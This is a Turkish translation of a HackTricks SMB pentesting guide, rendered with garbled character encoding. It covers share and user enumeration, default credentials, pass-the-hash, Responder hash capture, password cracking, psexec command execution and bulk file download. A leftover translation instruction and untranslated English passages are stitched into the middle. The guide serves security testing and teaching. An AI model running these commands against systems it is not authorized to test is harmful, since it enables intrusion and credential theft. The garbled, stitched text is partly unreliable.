# 139,445 - SMB Pentesting

<details>

<summary><strong>AWS hacklemeyi sÄ±fÄ±rdan kahramanla Ã¶ÄŸrenin</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS KÄ±rmÄ±zÄ± TakÄ±m UzmanÄ±)</strong></a><strong>!</strong></summary>

HackTricks'Ä± desteklemenin diÄŸer yollarÄ±:

* **Åirketinizi HackTricks'te reklamÄ±nÄ±zÄ± gÃ¶rmek veya HackTricks'i PDF olarak indirmek** iÃ§in [**ABONELÄ°K PLANLARI'na**](https://github.com/sponsors/carlospolop) gÃ¶z atÄ±n!
* [**Resmi PEASS & HackTricks Ã¼rÃ¼nlerini**](https://peass.creator-spring.com) edinin
* [**The PEASS Ailesi'ni**](https://opensea.io/collection/the-peass-family) keÅŸfedin, Ã¶zel [**NFT'lerimiz**](https://opensea.io/collection/the-peass-family) koleksiyonumuz
* ğŸ’¬ [**Discord grubuna**](https://discord.gg/hRep4RUj7f) veya [**telegram grubuna**](https://t.me/peass) **katÄ±lÄ±n** veya **Twitter** ğŸ¦ [**@carlospolopm**](https://twitter.com/hacktricks_live)**'u takip edin**.
* **Hacking hilelerinizi** [**HackTricks**](https://github.com/carlospolop/hacktricks) ve [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github depolarÄ±na **PR gÃ¶ndererek paylaÅŸÄ±n**.

</details>

## **Port 139**

**_AÄŸ Temel GiriÅŸ/Ã‡Ä±kÄ±ÅŸ Sistemi_ (NetBIOS)**, yerel bir aÄŸdaki (LAN) uygulamalarÄ±n, bilgisayarlarÄ±n ve masaÃ¼stlerinin aÄŸ donanÄ±mÄ±yla etkileÅŸimde bulunmasÄ±nÄ± ve verilerin aÄŸ Ã¼zerinde iletilmesini saÄŸlamak iÃ§in tasarlanmÄ±ÅŸ bir yazÄ±lÄ±m protokolÃ¼dÃ¼r. NetBIOS aÄŸÄ± Ã¼zerinde Ã§alÄ±ÅŸan yazÄ±lÄ±m uygulamalarÄ±nÄ±n tanÄ±mlanmasÄ± ve konumu, genellikle bilgisayar adÄ±ndan farklÄ± olan ve en fazla 16 karakter uzunluÄŸunda olabilen NetBIOS isimleri aracÄ±lÄ±ÄŸÄ±yla gerÃ§ekleÅŸtirilir. Ä°ki uygulama arasÄ±nda bir NetBIOS oturumu, bir uygulama (istemci olarak hareket eden) diÄŸer bir uygulamayÄ± (sunucu olarak hareket eden) "Ã§aÄŸÄ±rmak" iÃ§in bir komut verdiÄŸinde **TCP Port 139** kullanÄ±larak baÅŸlatÄ±lÄ±r.
```
139/tcp   open  netbios-ssn   Microsoft Windows netbios-ssn
```
## Port 445

Teknik olarak, Port 139 'NBT over IP' olarak adlandÄ±rÄ±lÄ±rken, Port 445 'SMB over IP' olarak tanÄ±mlanÄ±r. **SMB** kÄ±saltmasÄ± '**Server Message Blocks**' anlamÄ±na gelir ve modern olarak **Common Internet File System (CIFS)** olarak da bilinir. Uygulama katmanÄ± aÄŸ protokolÃ¼ olan SMB/CIFS, bir aÄŸdaki dÃ¼ÄŸÃ¼mler arasÄ±nda dosyalara, yazÄ±cÄ±lara, seri portlara paylaÅŸÄ±mlÄ± eriÅŸimi saÄŸlamak ve Ã§eÅŸitli iletiÅŸim biÃ§imlerini kolaylaÅŸtÄ±rmak iÃ§in kullanÄ±lÄ±r.

Ã–rneÄŸin, Windows baÄŸlamÄ±nda, SMB'nin doÄŸrudan TCP/IP Ã¼zerinden Ã§alÄ±ÅŸabilmesi iÃ§in NetBIOS over TCP/IP gereksinimini ortadan kaldÄ±rdÄ±ÄŸÄ± ve 445 numaralÄ± portun kullanÄ±ldÄ±ÄŸÄ± vurgulanmaktadÄ±r. Bununla birlikte, farklÄ± sistemlerde, 139 numaralÄ± portun kullanÄ±lmasÄ±, SMB'nin NetBIOS over TCP/IP ile birlikte yÃ¼rÃ¼tÃ¼ldÃ¼ÄŸÃ¼nÃ¼ gÃ¶sterir.
```
445/tcp   open  microsoft-ds  Windows 7 Professional 7601 Service Pack 1 microsoft-ds (workgroup: WORKGROUP)
```
### SMB

**Sunucu Ä°leti BloÄŸu (SMB)** protokolÃ¼, bir **istemci-sunucu** modelinde Ã§alÄ±ÅŸan ve **dosyalara**, dizinlere ve yazÄ±cÄ±lar gibi diÄŸer aÄŸ kaynaklarÄ±na eriÅŸimi dÃ¼zenlemek iÃ§in tasarlanmÄ±ÅŸtÄ±r. BaÅŸlÄ±ca olarak **Windows** iÅŸletim sistemi serisinde kullanÄ±lan SMB, geriye dÃ¶nÃ¼k uyumluluk saÄŸlar ve Microsoft'un eski sÃ¼rÃ¼mlerini Ã§alÄ±ÅŸtÄ±ran cihazlarÄ±n daha yeni sÃ¼rÃ¼mlerle sorunsuz etkileÅŸimde bulunmasÄ±nÄ± saÄŸlar. AyrÄ±ca, **Samba** projesi, SMB'nin **Linux** ve Unix sistemlerinde uygulanmasÄ±nÄ± saÄŸlayan Ã¼cretsiz bir yazÄ±lÄ±m Ã§Ã¶zÃ¼mÃ¼ sunarak SMB aracÄ±lÄ±ÄŸÄ±yla platformlar arasÄ± iletiÅŸimi kolaylaÅŸtÄ±rÄ±r.

SMB sunucusu tarafÄ±ndan saÄŸlanabilen **yerel dosya sisteminin keyfi parÃ§alarÄ±nÄ±** temsil eden paylaÅŸÄ±mlar, sunucunun gerÃ§ek yapÄ±sÄ±ndan baÄŸÄ±msÄ±z olarak bir istemciye kÄ±smen gÃ¶rÃ¼nÃ¼r hale getirilir. EriÅŸim haklarÄ±nÄ± tanÄ±mlayan **EriÅŸim Kontrol Listeleri (ACL'ler)**, **yÃ¼rÃ¼tme**, **okuma** ve **tam eriÅŸim** gibi Ã¶zellikler de dahil olmak Ã¼zere kullanÄ±cÄ± izinleri Ã¼zerinde **detaylÄ± kontrol** saÄŸlar. Bu izinler, paylaÅŸÄ±mlara dayalÄ± olarak bireysel kullanÄ±cÄ±lara veya gruplara atanabilir ve sunucuda belirlenen yerel izinlerden farklÄ±dÄ±r.

### IPC$ PaylaÅŸÄ±mÄ±

IPC$ paylaÅŸÄ±mÄ±na anonim bir boÅŸ oturum aracÄ±lÄ±ÄŸÄ±yla eriÅŸim saÄŸlanabilir, bu da adlandÄ±rÄ±lmÄ±ÅŸ borular aracÄ±lÄ±ÄŸÄ±yla sunulan hizmetlerle etkileÅŸim saÄŸlar. Bu amaÃ§la `enum4linux` aracÄ± kullanÄ±ÅŸlÄ±dÄ±r. DoÄŸru bir ÅŸekilde kullanÄ±ldÄ±ÄŸÄ±nda, aÅŸaÄŸÄ±dakilerin elde edilmesini saÄŸlar:

- Ä°ÅŸletim sistemi hakkÄ±nda bilgi
- Ana etki alanÄ± hakkÄ±nda detaylar
- Yerel kullanÄ±cÄ±lar ve gruplarÄ±n derlemesi
- KullanÄ±labilir SMB paylaÅŸÄ±mlarÄ± hakkÄ±nda bilgi
- Etkili sistem gÃ¼venlik politikasÄ±

Bu iÅŸlevsellik, aÄŸ yÃ¶neticileri ve gÃ¼venlik uzmanlarÄ±nÄ±n bir aÄŸdaki SMB (Sunucu Ä°leti BloÄŸu) hizmetlerinin gÃ¼venlik durumunu deÄŸerlendirmesi iÃ§in Ã¶nemlidir. `enum4linux`, hedef sistemin SMB ortamÄ±nÄ±n kapsamlÄ± bir gÃ¶rÃ¼nÃ¼mÃ¼nÃ¼ saÄŸlar ve potansiyel zayÄ±flÄ±klarÄ± belirlemek ve SMB hizmetlerinin uygun ÅŸekilde gÃ¼vence altÄ±na alÄ±ndÄ±ÄŸÄ±ndan emin olmak iÃ§in Ã¶nemlidir.
```bash
enum4linux -a target_ip
```
YukarÄ±daki komut, `enum4linux`'un `target_ip` tarafÄ±ndan belirtilen bir hedefe karÅŸÄ± tam bir numaralandÄ±rma yapmak iÃ§in nasÄ±l kullanÄ±labileceÄŸinin bir Ã¶rneÄŸidir.


## NTLM Nedir

NTLM hakkÄ±nda bilgi sahibi deÄŸilseniz veya nasÄ±l Ã§alÄ±ÅŸtÄ±ÄŸÄ±nÄ± ve nasÄ±l kÃ¶tÃ¼ye kullanÄ±labileceÄŸini Ã¶ÄŸrenmek isterseniz, **NTLM** hakkÄ±nda Ã§ok ilginÃ§ bulacaÄŸÄ±nÄ±z bu sayfada bu protokolÃ¼n nasÄ±l Ã§alÄ±ÅŸtÄ±ÄŸÄ± ve nasÄ±l avantaj saÄŸlayabileceÄŸiniz aÃ§Ä±klanmaktadÄ±r:

{% content-ref url="../windows-hardening/ntlm/" %}
[ntlm](../windows-hardening/ntlm/)
{% endcontent-ref %}

## **Sunucu NumaralandÄ±rma**

### Bir aÄŸda sunucularÄ± aramak iÃ§in **Tarama** yapÄ±n:
```bash
nbtscan -r 192.168.0.1/24
```
### SMB sunucu sÃ¼rÃ¼mÃ¼

SMB sÃ¼rÃ¼mÃ¼ne yÃ¶nelik olasÄ± zafiyetleri aramak iÃ§in hangi sÃ¼rÃ¼mÃ¼n kullanÄ±ldÄ±ÄŸÄ±nÄ± bilmek Ã¶nemlidir. Bu bilgi diÄŸer kullanÄ±lan araÃ§larda gÃ¶rÃ¼nmÃ¼yorsa, ÅŸunlarÄ± yapabilirsiniz:

* **MSF** yardÄ±mcÄ± modÃ¼lÃ¼ olan \_**auxiliary/scanner/smb/smb\_version** kullanÄ±n
* Veya bu betiÄŸi kullanÄ±n:
```bash
#!/bin/sh
#Author: rewardone
#Description:
# Requires root or enough permissions to use tcpdump
# Will listen for the first 7 packets of a null login
# and grab the SMB Version
#Notes:
# Will sometimes not capture or will print multiple
# lines. May need to run a second time for success.
if [ -z $1 ]; then echo "Usage: ./smbver.sh RHOST {RPORT}" && exit; else rhost=$1; fi
if [ ! -z $2 ]; then rport=$2; else rport=139; fi
tcpdump -s0 -n -i tap0 src $rhost and port $rport -A -c 7 2>/dev/null | grep -i "samba\|s.a.m" | tr -d '.' | grep -oP 'UnixSamba.*[0-9a-z]' | tr -d '\n' & echo -n "$rhost: " &
echo "exit" | smbclient -L $rhost 1>/dev/null 2>/dev/null
echo "" && sleep .1
```
### **Exploit arama**
```bash
msf> search type:exploit platform:windows target:2008 smb
searchsploit microsoft smb
```
### **MÃ¼mkÃ¼n** Kimlik Bilgileri

| **KullanÄ±cÄ± AdÄ±(larÄ±)** | **YaygÄ±n Åifreler**                       |
| ---------------------- | ----------------------------------------- |
| _(boÅŸ)_                | _(boÅŸ)_                                   |
| guest                  | _(boÅŸ)_                                   |
| Administrator, admin   | _(boÅŸ)_, password, administrator, admin   |
| arcserve               | arcserve, backup                          |
| tivoli, tmersrvd       | tivoli, tmersrvd, admin                   |
| backupexec, backup     | backupexec, backup, arcada                |
| test, lab, demo        | password, test, lab, demo                 |

### Brute Force

* [**SMB Brute Force**](../generic-methodologies-and-resources/brute-force.md#smb)

### SMB Ortam Bilgileri

### Bilgi Edinme
```bash
#Dump interesting information
enum4linux -a [-u "<username>" -p "<passwd>"] <IP>
enum4linux-ng -A [-u "<username>" -p "<passwd>"] <IP>
nmap --script "safe or smb-enum-*" -p 445 <IP>

#Connect to the rpc
rpcclient -U "" -N <IP> #No creds
rpcclient //machine.htb -U domain.local/USERNAME%754d87d42adabcca32bdb34a876cbffb  --pw-nt-hash
rpcclient -U "username%passwd" <IP> #With creds
#You can use querydispinfo and enumdomusers to query user information

#Dump user information
/usr/share/doc/python3-impacket/examples/samrdump.py -port 139 [[domain/]username[:password]@]<targetName or address>
/usr/share/doc/python3-impacket/examples/samrdump.py -port 445 [[domain/]username[:password]@]<targetName or address>

#Map possible RPC endpoints
/usr/share/doc/python3-impacket/examples/rpcdump.py -port 135 [[domain/]username[:password]@]<targetName or address>
/usr/share/doc/python3-impacket/examples/rpcdump.py -port 139 [[domain/]username[:password]@]<targetName or address>
/usr/share/doc/python3-impacket/examples/rpcdump.py -port 445 [[domain/]username[:password]@]<targetName or address>
```
### KullanÄ±cÄ±larÄ±, GruplarÄ± ve Oturum AÃ§mÄ±ÅŸ KullanÄ±cÄ±larÄ± Saptama

Bu bilgiler zaten enum4linux ve enum4linux-ng ile toplanmalÄ±dÄ±r.
```bash
crackmapexec smb 10.10.10.10 --users [-u <username> -p <password>]
crackmapexec smb 10.10.10.10 --groups [-u <username> -p <password>]
crackmapexec smb 10.10.10.10 --groups --loggedon-users [-u <username> -p <password>]

ldapsearch -x -b "DC=DOMAIN_NAME,DC=LOCAL" -s sub "(&(objectclass=user))" -h 10.10.10.10 | grep -i samaccountname: | cut -f 2 -d " "

rpcclient -U "" -N 10.10.10.10
enumdomusers
enumdomgroups
```
### Yerel kullanÄ±cÄ±larÄ± sÄ±ralama

[Impacket](https://github.com/fortra/impacket/blob/master/examples/lookupsid.py)
```bash
lookupsid.py -no-pass hostname.local
```
AÅŸaÄŸÄ±da, SMB (Server Message Block) hakkÄ±nda bilgi iÃ§eren bir hacking kitabÄ±ndan alÄ±nan iÃ§erik bulunmaktadÄ±r. Ä°lgili Ä°ngilizce metni TÃ¼rkÃ§e'ye Ã§evirin ve Ã§eviriyi aynÄ± markdown ve html sÃ¶zdizimiyle geri dÃ¶ndÃ¼rÃ¼n. Kod, hacking teknik adlarÄ±, hacking kelimesi, bulut/SaaS platform adlarÄ± (Ã¶rneÄŸin Workspace, aws, gcp...), 'sÄ±zÄ±ntÄ±' kelimesi, pentesting ve markdown etiketleri gibi ÅŸeyleri Ã§evirmeyin. AyrÄ±ca, Ã§eviri ve markdown sÃ¶zdizimi dÄ±ÅŸÄ±nda herhangi bir ekstra ÅŸey eklemeyin.
```bash
for i in $(seq 500 1100);do rpcclient -N -U "" 10.10.10.10 -c "queryuser 0x$(printf '%x\n' $i)" | grep "User Name\|user_rid\|group_rid" && echo "";done
```
Metasploit - Yerel kullanÄ±cÄ±larÄ± sÄ±ralama

Bu modÃ¼l, hedef SMB sunucusunda yerel kullanÄ±cÄ± hesaplarÄ±nÄ± sÄ±ralamak iÃ§in kullanÄ±lÄ±r. Bu bilgiler, hedef aÄŸdaki kullanÄ±cÄ± hesaplarÄ±nÄ± belirlemek ve daha fazla saldÄ±rÄ± vektÃ¶rÃ¼ oluÅŸturmak iÃ§in kullanÄ±labilir.

ModÃ¼lÃ¼ kullanmak iÃ§in aÅŸaÄŸÄ±daki adÄ±mlarÄ± izleyin:

1. Metasploit konsolunu aÃ§Ä±n.
2. `use auxiliary/scanner/smb/smb_enumusers` komutunu kullanarak modÃ¼lÃ¼ yÃ¼kleyin.
3. `set RHOSTS <hedef_IP>` komutunu kullanarak hedef SMB sunucusunun IP adresini belirtin.
4. `run` komutunu kullanarak modÃ¼lÃ¼ Ã§alÄ±ÅŸtÄ±rÄ±n.

ModÃ¼l, hedef SMB sunucusunda yerel kullanÄ±cÄ± hesaplarÄ±nÄ± sÄ±ralayacak ve sonuÃ§larÄ± size sunacaktÄ±r. Bu bilgileri kullanarak hedef aÄŸdaki kullanÄ±cÄ± hesaplarÄ±nÄ± analiz edebilir ve saldÄ±rÄ±larÄ±nÄ±zÄ± daha da geliÅŸtirebilirsiniz.
```bash
use auxiliary/scanner/smb/smb_lookupsid
set rhosts hostname.local
run
```
### **LSARPC ve SAMR rpcclient'in NumaralandÄ±rÄ±lmasÄ±**

{% content-ref url="pentesting-smb/rpcclient-enumeration.md" %}
[rpcclient-enumeration.md](pentesting-smb/rpcclient-enumeration.md)
{% endcontent-ref %}

### Linux'tan GUI baÄŸlantÄ±sÄ±

#### Terminalde:

`xdg-open smb://cascade.htb/`

#### Dosya tarayÄ±cÄ± penceresinde (nautilus, thunar, vb.)

`smb://friendzone.htb/general/`

## PaylaÅŸÄ±lan KlasÃ¶rlerin NumaralandÄ±rÄ±lmasÄ±

### PaylaÅŸÄ±lan klasÃ¶rleri listeleme

Her zaman herhangi bir ÅŸeye eriÅŸip eriÅŸemediÄŸinizi kontrol etmeniz Ã¶nerilir, kimlik bilgileriniz yoksa **null** **kimlik bilgileri/misafir kullanÄ±cÄ±** kullanmayÄ± deneyin.
```bash
smbclient --no-pass -L //<IP> # Null user
smbclient -U 'username[%passwd]' -L [--pw-nt-hash] //<IP> #If you omit the pwd, it will be prompted. With --pw-nt-hash, the pwd provided is the NT hash

smbmap -H <IP> [-P <PORT>] #Null user
smbmap -u "username" -p "password" -H <IP> [-P <PORT>] #Creds
smbmap -u "username" -p "<NT>:<LM>" -H <IP> [-P <PORT>] #Pass-the-Hash
smbmap -R -u "username" -p "password" -H <IP> [-P <PORT>] #Recursive list

crackmapexec smb <IP> -u '' -p '' --shares #Null user
crackmapexec smb <IP> -u 'username' -p 'password' --shares #Guest user
crackmapexec smb <IP> -u 'username' -H '<HASH>' --shares #Guest user
```
To connect to a shared folder on a remote machine, you can use the `smbclient` tool. This tool allows you to interact with SMB (Server Message Block) shares.

To connect to a shared folder, use the following command:

```plaintext
smbclient //<IP_ADDRESS>/<SHARE_NAME> -U <USERNAME>
```

Replace `<IP_ADDRESS>` with the IP address of the remote machine and `<SHARE_NAME>` with the name of the shared folder you want to connect to. Additionally, replace `<USERNAME>` with a valid username on the remote machine.

Once connected, you can use various commands to interact with the shared folder. For example, you can use the `ls` command to list the contents of the shared folder:

```plaintext
ls
```

This will display a list of files and directories within the shared folder.

To exit the `smbclient` tool, use the `exit` command:

```plaintext
exit
```

This will disconnect you from the shared folder.
```bash
#Connect using smbclient
smbclient --no-pass //<IP>/<Folder>
smbclient -U 'username[%passwd]' -L [--pw-nt-hash] //<IP> #If you omit the pwd, it will be prompted. With --pw-nt-hash, the pwd provided is the NT hash
#Use --no-pass -c 'recurse;ls'  to list recursively with smbclient

#List with smbmap, without folder it list everything
smbmap [-u "username" -p "password"] -R [Folder] -H <IP> [-P <PORT>] # Recursive list
smbmap [-u "username" -p "password"] -r [Folder] -H <IP> [-P <PORT>] # Non-Recursive list
smbmap -u "username" -p "<NT>:<LM>" [-r/-R] [Folder] -H <IP> [-P <PORT>] #Pass-the-Hash
```
### **Windows paylaÅŸÄ±mlarÄ±nÄ± manuel olarak sÄ±ralama ve baÄŸlantÄ± kurma**

Makineye ait paylaÅŸÄ±mlarÄ±n gÃ¶rÃ¼ntÃ¼lenmesi kÄ±sÄ±tlanmÄ±ÅŸ olabilir ve listelemeye Ã§alÄ±ÅŸtÄ±ÄŸÄ±nÄ±zda baÄŸlanÄ±lacak paylaÅŸÄ±m bulunmadÄ±ÄŸÄ± gibi gÃ¶rÃ¼nebilir. Bu nedenle, paylaÅŸÄ±ma manuel olarak baÄŸlanmayÄ± denemek faydalÄ± olabilir. PaylaÅŸÄ±mlarÄ± manuel olarak sÄ±ralamak iÃ§in geÃ§erli bir oturum (Ã¶rneÄŸin, boÅŸ oturum veya geÃ§erli kimlik bilgileri) kullanÄ±rken NT\_STATUS\_ACCESS\_DENIED ve NT\_STATUS\_BAD\_NETWORK\_NAME gibi yanÄ±tlarÄ± aramak isteyebilirsiniz. Bu yanÄ±tlar, paylaÅŸÄ±mÄ±n var olup olmadÄ±ÄŸÄ±nÄ± ve eriÅŸiminizin olup olmadÄ±ÄŸÄ±nÄ± veya paylaÅŸÄ±mÄ±n hiÃ§ olmadÄ±ÄŸÄ±nÄ± gÃ¶sterebilir.

Windows hedefleri iÃ§in yaygÄ±n paylaÅŸÄ±m adlarÄ± ÅŸunlardÄ±r:

* C$
* D$
* ADMIN$
* IPC$
* PRINT$
* FAX$
* SYSVOL
* NETLOGON

(_**Network Security Assessment 3. baskÄ±**_ kitabÄ±ndan yaygÄ±n paylaÅŸÄ±m adlarÄ±)

AÅŸaÄŸÄ±daki komutu kullanarak bunlara baÄŸlanmayÄ± deneyebilirsiniz:
```bash
smbclient -U '%' -N \\\\<IP>\\<SHARE> # null session to connect to a windows share
smbclient -U '<USER>' \\\\<IP>\\<SHARE> # authenticated session to connect to a windows share (you will be prompted for a password)
```
veya bu betik (bir null oturumu kullanarak)
```bash
#/bin/bash

ip='<TARGET-IP-HERE>'
shares=('C$' 'D$' 'ADMIN$' 'IPC$' 'PRINT$' 'FAX$' 'SYSVOL' 'NETLOGON')

for share in ${shares[*]}; do
output=$(smbclient -U '%' -N \\\\$ip\\$share -c '')

if [[ -z $output ]]; then
echo "[+] creating a null session is possible for $share" # no output if command goes through, thus assuming that a session was created
else
echo $output # echo error message (e.g. NT_STATUS_ACCESS_DENIED or NT_STATUS_BAD_NETWORK_NAME)
fi
done
```
Ã–rnekler
---------

AÅŸaÄŸÄ±da, SMB (Server Message Block) hizmetlerini pentest etmek iÃ§in kullanÄ±lan bazÄ± yaygÄ±n teknikler bulunmaktadÄ±r:

### SMB Versiyon TaramasÄ±

SMB hizmetinin Ã§alÄ±ÅŸtÄ±ÄŸÄ± versiyonu belirlemek iÃ§in bir SMB taramasÄ± yapÄ±labilir. Bu, hedef sistemdeki zayÄ±f noktalarÄ± belirlemek iÃ§in Ã¶nemli bir adÄ±mdÄ±r. AÅŸaÄŸÄ±daki komutla SMB versiyonunu taramak mÃ¼mkÃ¼ndÃ¼r:

```bash
nmap -p 445 --script smb-protocols <hedef-ip>
```

### SMB PaylaÅŸÄ±mlarÄ±nÄ± Listeleyerek Bilgi Toplama

SMB hizmeti, bir sistemdeki paylaÅŸÄ±mlarÄ± saÄŸlar. Bu paylaÅŸÄ±mlar, hedef sistemdeki dosya ve klasÃ¶rlere eriÅŸim saÄŸlar. Bilgi toplamak iÃ§in aÅŸaÄŸÄ±daki komut kullanÄ±labilir:

```bash
smbclient -L //<hedef-ip>
```

### SMB PaylaÅŸÄ±mlarÄ±na EriÅŸim

SMB paylaÅŸÄ±mlarÄ±na eriÅŸim saÄŸlamak iÃ§in smbclient aracÄ± kullanÄ±labilir. AÅŸaÄŸÄ±daki komutla hedef sistemdeki bir paylaÅŸÄ±ma baÄŸlanabilirsiniz:

```bash
smbclient //<hedef-ip>/<paylaÅŸÄ±m-adÄ±>
```

### SMB Hash Yakalama

SMB hizmeti, kullanÄ±cÄ± kimlik doÄŸrulamasÄ± iÃ§in NTLM hash'lerini kullanÄ±r. Bu hash'leri yakalamak, saldÄ±rganÄ±n kimlik avÄ± veya parola kÄ±rma saldÄ±rÄ±larÄ± gerÃ§ekleÅŸtirmesine olanak tanÄ±r. AÅŸaÄŸÄ±daki komutla SMB hash'lerini yakalayabilirsiniz:

```bash
Responder -I eth0 -rdw
```

### SMB Parola KÄ±rma

Yakalanan SMB hash'lerini kÄ±rmak iÃ§in Ã§eÅŸitli araÃ§lar kullanÄ±labilir. Bunlardan biri John the Ripper'dÄ±r. AÅŸaÄŸÄ±daki komutla SMB hash'lerini kÄ±rabilirsiniz:

```bash
john --format=NT --wordlist=<wordlist-dosyasÄ±> <hash-dosyasÄ±>
```

### SMB Dosya Transferi

SMB hizmeti, dosya transferi iÃ§in kullanÄ±labilir. smbclient aracÄ± veya smbget aracÄ± kullanÄ±larak dosyalar hedef sistemden alÄ±nabilir veya hedef sisteme gÃ¶nderilebilir. AÅŸaÄŸÄ±daki komutlarla dosya transferi yapabilirsiniz:

```bash
smbclient //<hedef-ip>/<paylaÅŸÄ±m-adÄ±> -c 'get <dosya-adÄ±>'
smbclient //<hedef-ip>/<paylaÅŸÄ±m-adÄ±> -c 'put <dosya-adÄ±>'
smbget smb://<hedef-ip>/<paylaÅŸÄ±m-adÄ±>/<dosya-adÄ±>
```

### SMB Komut YÃ¼rÃ¼tme

SMB hizmeti, hedef sistemde komut yÃ¼rÃ¼tmek iÃ§in kullanÄ±labilir. smbclient aracÄ± veya psexec aracÄ± kullanÄ±larak komutlar hedef sisteme gÃ¶nderilebilir. AÅŸaÄŸÄ±daki komutlarla komut yÃ¼rÃ¼tebilirsiniz:

```bash
smbclient //<hedef-ip>/<paylaÅŸÄ±m-adÄ±> -c '<komut>'
psexec.py <hedef-ip> -u <kullanÄ±cÄ±-adÄ±> -p <parola> "<komut>"
```

Bu teknikler, SMB hizmetlerini pentest etmek iÃ§in kullanÄ±lan yaygÄ±n yÃ¶ntemlerdir. Bu teknikleri kullanarak hedef sistemdeki zayÄ±f noktalarÄ± belirleyebilir ve gÃ¼venlik aÃ§Ä±klarÄ±nÄ± tespit edebilirsiniz.
```bash
smbclient -U '%' -N \\\\192.168.0.24\\im_clearly_not_here # returns NT_STATUS_BAD_NETWORK_NAME
smbclient -U '%' -N \\\\192.168.0.24\\ADMIN$ # returns NT_STATUS_ACCESS_DENIED or even gives you a session
```
### **Windows'tan paylaÅŸÄ±mlarÄ± sÄ±ralama / Ã¼Ã§Ã¼ncÃ¼ taraf araÃ§larÄ± olmadan**

PowerShell
```powershell
# Retrieves the SMB shares on the locale computer.
Get-SmbShare
Get-WmiObject -Class Win32_Share
# Retrieves the SMB shares on a remote computer.
get-smbshare -CimSession "<computer name or session object>"
# Retrieves the connections established from the local SMB client to the SMB servers.
Get-SmbConnection
```
CMD konsolu
```shell
# List shares on the local computer
net share
# List shares on a remote computer (including hidden ones)
net view \\<ip> /all
```
MMC Snap-in (grafiksel)
```shell
# Shared Folders: Shared Folders > Shares
fsmgmt.msc
# Computer Management: Computer Management > System Tools > Shared Folders > Shares
compmgmt.msc
```
explorer.exe (grafiksel), mevcut gizli olmayan paylaÅŸÄ±mlarÄ± gÃ¶rmek iÃ§in `\\<ip>\` yazÄ±n.

### PaylaÅŸÄ±lan bir klasÃ¶rÃ¼ baÄŸlama
```bash
mount -t cifs //x.x.x.x/share /mnt/share
mount -t cifs -o "username=user,password=password" //x.x.x.x/share /mnt/share
```
### **DosyalarÄ± Ä°ndirme**

Kimlik bilgileriyle/Pass-the-Hash ile nasÄ±l baÄŸlanacaÄŸÄ±nÄ±zÄ± Ã¶ÄŸrenmek iÃ§in Ã¶nceki bÃ¶lÃ¼mleri okuyun.
```bash
#Search a file and download
sudo smbmap -R Folder -H <IP> -A <FileName> -q # Search the file in recursive mode and download it inside /usr/share/smbmap
```

```bash
#Download all
smbclient //<IP>/<share>
> mask ""
> recurse
> prompt
> mget *
#Download everything to current directory
```
Komutlar:

* mask: dizin iÃ§indeki dosyalarÄ± filtrelemek iÃ§in kullanÄ±lan maskeyi belirtir (Ã¶rneÄŸin, tÃ¼m dosyalar iÃ§in "")
* recurse: rekÃ¼rsiv iÅŸlemi aÃ§ar (varsayÄ±lan: kapalÄ±)
* prompt: dosya adlarÄ± iÃ§in soru sormayÄ± kapatÄ±r (varsayÄ±lan: aÃ§Ä±k)
* mget: maskeye uyan tÃ¼m dosyalarÄ± ana makineden istemci makineye kopyalar

(_Smbclient'in man sayfasÄ±ndan bilgiler_)

### Etki AlanÄ± PaylaÅŸÄ±lan KlasÃ¶rler Arama

* [**Snaffler**](https://github.com/SnaffCon/Snaffler)\*\*\*\*
```bash
Snaffler.exe -s -d domain.local -o snaffler.log -v data
```
* [**CrackMapExec**](https://wiki.porchetta.industries/smb-protocol/spidering-shares) Ã¶rÃ¼mcek.
* `-M spider_plus [--share <paylaÅŸÄ±m_adÄ±>]`
* `--pattern txt`
```bash
sudo crackmapexec smb 10.10.10.10 -u username -p pass -M spider_plus --share 'Department Shares'
```
PaylaÅŸÄ±mlardan Ã¶zellikle ilginÃ§ olanlar, Grup Ä°lkesi aracÄ±lÄ±ÄŸÄ±yla otomatik oturum aÃ§ma yapÄ±landÄ±rÄ±lmÄ±ÅŸ kullanÄ±cÄ±lar iÃ§in ÅŸifreler iÃ§erebilecek olan **`Registry.xml`** adlÄ± dosyalardÄ±r. Veya kimlik bilgileri iÃ§eren **`web.config`** dosyalarÄ±.

{% hint style="info" %}
**SYSVOL paylaÅŸÄ±mÄ±**, etki alanÄ±ndaki tÃ¼m kimlik doÄŸrulama yapÄ±lmÄ±ÅŸ kullanÄ±cÄ±lar tarafÄ±ndan **okunabilir**. Orada birÃ§ok farklÄ± toplu iÅŸ, VBScript ve PowerShell **betikleri** bulabilirsiniz.\
Ä°Ã§indeki **betikleri** kontrol etmelisiniz, Ã§Ã¼nkÃ¼ ÅŸifreler gibi hassas bilgiler bulabilirsiniz.
{% endhint %}

## Registry Okuma

BazÄ± keÅŸfedilen kimlik bilgilerini kullanarak **registry'yi okuyabilirsiniz**. Impacket **`reg.py`** kullanarak deneyebilirsiniz:
```bash
sudo reg.py domain.local/USERNAME@MACHINE.htb -hashes 1a3487d42adaa12332bdb34a876cb7e6:1a3487d42adaa12332bdb34a876cb7e6 query -keyName HKU -s
sudo reg.py domain.local/USERNAME@MACHINE.htb -hashes 1a3487d42adaa12332bdb34a876cb7e6:1a3487d42adaa12332bdb34a876cb7e6 query -keyName HKCU -s
sudo reg.py domain.local/USERNAME@MACHINE.htb -hashes 1a3487d42adaa12332bdb34a876cb7e6:1a3487d42adaa12332bdb34a876cb7e6 query -keyName HKLM -s
```
## Son AÅŸama SaldÄ±rÄ±

Bir Samba sunucusunun **varsayÄ±lan yapÄ±landÄ±rmasÄ±** genellikle `/etc/samba/smb.conf` dosyasÄ±nda bulunur ve bazÄ± **tehlikeli yapÄ±landÄ±rmalara** sahip olabilir:

| **Ayar**                    | **AÃ§Ä±klama**                                                       |
| --------------------------- | ------------------------------------------------------------------- |
| `browseable = yes`          | Mevcut paylaÅŸÄ±mlarda paylaÅŸÄ±mlarÄ± listelemeye izin verir mi?         |
| `read only = no`            | DosyalarÄ±n oluÅŸturulmasÄ±nÄ± ve deÄŸiÅŸtirilmesini yasaklar mÄ±?          |
| `writable = yes`            | KullanÄ±cÄ±larÄ±n dosya oluÅŸturmasÄ±na ve deÄŸiÅŸtirmesine izin verir mi?  |
| `guest ok = yes`            | Åifre kullanmadan hizmete baÄŸlanmaya izin verir mi?                  |
| `enable privileges = yes`   | Belirli SID'ye atanmÄ±ÅŸ ayrÄ±calÄ±klarÄ± onaylar mÄ±?                     |
| `create mask = 0777`        | Yeni oluÅŸturulan dosyalara hangi izinler atanmalÄ±dÄ±r?                |
